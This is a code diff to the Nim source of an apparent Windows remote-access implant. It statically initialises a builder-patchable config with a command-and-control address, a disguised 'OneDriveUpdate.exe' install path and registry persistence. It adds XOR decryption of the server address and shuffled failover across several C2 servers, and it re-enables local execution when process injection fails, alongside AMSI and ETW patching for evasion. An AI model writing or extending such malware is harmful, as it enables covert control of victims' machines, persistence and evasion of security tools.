@@ -54,15 +54,39 @@ type
     arg1*: uint32
     arg2*: uint32
 
+# Helper to assign string to char array
+proc toCharArray[N: static[int]](s: string): array[N, char] =
+  for i in 0 ..< min(s.len, N):
+    result[i] = s[i]
+
 # Global configuration variable, exported to C so it's not optimized out
 # and can be found by the builder searching for "FRMD26_CONFIG"
-var g_config* {.exportc, dynlib.}: CONNECT_ADDRESS
-
-# Helper to assign string to char array
-template assign(arr: var openArray[char], s: string) =
-  for i in 0 ..< min(arr.len - 1, s.len):
-    arr[i] = s[i]
-  arr[min(arr.len - 1, s.len)] = '\0'
+var g_config* {.exportc, dynlib, used.} = CONNECT_ADDRESS(
+  szFlag: toCharArray[32]("FRMD26_CONFIG"),
+  szServerIP: toCharArray[100]("127.0.0.1"),
+  szPort: toCharArray[8]("8080"),
+  iType: 0,
+  bEncrypt: 0,
+  szBuildDate: toCharArray[12]("2026-02-10"),
+  iMultiOpen: 1,
+  iStartup: 1,
+  iHeaderEnc: 1,
+  protoType: 0.char,
+  runningType: 0.char,
+  payloadType: 0.char,
+  szGroupName: toCharArray[24]("default"),
+  runasAdmin: 1.char,
+  szInstallDir: toCharArray[260](r"C:\ProgramData\Microsoft\OneDriveUpdate"),
+  szInstallName: toCharArray[260]("OneDriveUpdate.exe"),
+  szDownloadUrl: toCharArray[512](""),
+  taskStartup: 0.char,
+  serviceStartup: 0.char,
+  registryStartup: 1.char,
+  iPumpSize: 0,
+  clientID: 0,
+  parentHwnd: 0,
+  superAdmin: 0
+)
 
 # Helper to convert char array to string
 proc toString(arr: openArray[char]): string =
@@ -70,17 +94,6 @@ proc toString(arr: openArray[char]): string =
   for c in arr:
     if c == '\0': break
     result.add(c)
-
-proc init_default_config() =
-  assign(g_config.szFlag, "FRMD26_CONFIG")
-  assign(g_config.szServerIP, "127.0.0.1")
-  assign(g_config.szPort, "8080")
-  g_config.iType = 0
-  g_config.bEncrypt = 0
-  assign(g_config.szBuildDate, "2026-02-10")
-  assign(g_config.szInstallDir, r"C:\ProgramData\Microsoft\OneDriveUpdate")
-  assign(g_config.szInstallName, "OneDriveUpdate.exe")
-  g_config.registryStartup = 1.char
 
 # --- Patching Logic ---
 
@@ -172,6 +185,9 @@ proc installSelf() =
       ExitProcess(0)
       
   except:
+    when defined(debug):
+      var msg = "Installation failed: " & getCurrentExceptionMsg()
+      MessageBoxA(0, msg.cstring, "Error", 0)
     discard
 
 # --- Injection Logic ---
@@ -302,14 +318,37 @@ proc send_pkg(s: SOCKET, cmd: uint32, data: pointer, len: int) =
   if len > 0:
     send(s, cast[ptr char](data), int32(len), 0)
 
+import std/random
+
 proc run_client_loop() =
   var wsa: WSAData
   if WSAStartup(0x0202, addr wsa) != 0:
     return
 
   # Use global config
-  let serverIP = toString(g_config.szServerIP)
+  var rawIP = toString(g_config.szServerIP)
+  
+  # Decrypt IP if needed
+  if g_config.bEncrypt == 1:
+    var decrypted = ""
+    for c in rawIP:
+      decrypted.add(char(byte(c) xor 0x5A))
+    rawIP = decrypted
+
   let serverPort = parseInt(toString(g_config.szPort))
+  var serverList = rawIP.split(";")
+  
+  # If random mode (0), shuffle the list
+  if g_config.runningType == 0.char:
+    randomize()
+    shuffle(serverList)
+
+  # Parallel mode (1) handling:
+  # In this simple loop implementation, we try IPs sequentially.
+  # True parallel connection would require async/threads.
+  # For stability, sequential retry is sufficient for "multi-c2" availability.
+
+  var currentServerIdx = 0
 
   while true:
     if sock == INVALID_SOCKET:
@@ -321,12 +360,17 @@ proc run_client_loop() =
       var addr_in: sockaddr_in
       addr_in.sin_family = AF_INET
       addr_in.sin_port = htons(uint16(serverPort))
-      addr_in.sin_addr.S_addr = inet_addr(serverIP)
+      
+      let currentIP = serverList[currentServerIdx]
+      addr_in.sin_addr.S_addr = inet_addr(currentIP)
 
       if connect(sock, cast[ptr sockaddr](addr addr_in), int32(sizeof(addr_in))) == SOCKET_ERROR:
         closesocket(sock)
         sock = INVALID_SOCKET
-        Sleep(5000)
+        
+        # Try next server
+        currentServerIdx = (currentServerIdx + 1) mod serverList.len
+        Sleep(2000) # Short delay before next retry
         continue
       
       # Send Heartbeat as handshake
@@ -383,7 +427,7 @@ proc run_client_loop() =
 
 when isMainModule:
   # Initialize config
-  init_default_config()
+  # init_default_config() - Removed, using static initialization
 
   # 1. Evasion (AMSI / ETW)
   discard patchAmsi()
@@ -421,6 +465,6 @@ when isMainModule:
         # Injection successful, exit self
         discard
       else:
-        # Injection failed, fallback to local run (optional)
-        # run_client_loop()
-        discard
+        # Injection failed, fallback to local run
+        # This is critical if injection is blocked or fails
+        run_client_loop()
